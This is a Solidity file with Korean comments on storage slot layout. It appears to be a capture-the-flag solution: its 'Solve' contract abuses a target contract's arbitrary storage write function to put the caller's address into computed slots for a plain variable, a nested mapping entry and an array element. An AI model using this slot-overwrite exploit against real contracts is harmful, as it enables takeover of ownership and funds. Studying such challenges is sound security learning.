// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 해설
 * 1. Storage Slot 구조: 256비트 단위로 1개의 Storage Slot 구성, 선언된 순서대로 나열
 * 2. 단순 자료형의 Storage Slot 구조: 256비트 단위로 스토리지 공간에 데이터 할당
 *    (공유 가능할 경우 한개의 Storage에 여러 개의 데이터 존재 가능성 있음)
 * 3. Mapping 자료형의 Storage Slot 구조: 데이터 N + 데이터 N - 1 + ... + 데이터 1 + 선언 Slot 번호
 * 4. Array 자료형의 Storage Slot 구조
 *   - 선언 슬롯 번호: Array 길이
 *   - keccak256(선언 슬롯 번호) + N (요소 번호): Array 데이터 실제 저장 위치
 */

interface Temple {
    function write(uint256, bytes32) external;
}

contract Solve {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        // Answer of Simple Types
        Temple(target).write(1, bytes32(uint256(uint160(msg.sender))));

        // Answer of Mappings
        Temple(target).write(
            uint(keccak256(
                    abi.encode(22, 
                        uint256(keccak256(abi.encode(20, 2)))
                    )
                )
            ), bytes32(uint256(uint160(msg.sender)))
        );

        // Answer of Arrays
        Temple(target).write(3, bytes32(uint256(6)));   // Update length
        Temple(target).write(uint(keccak256(abi.encode(3))) + 5,
            bytes32(uint256(uint160(msg.sender))));
    }
}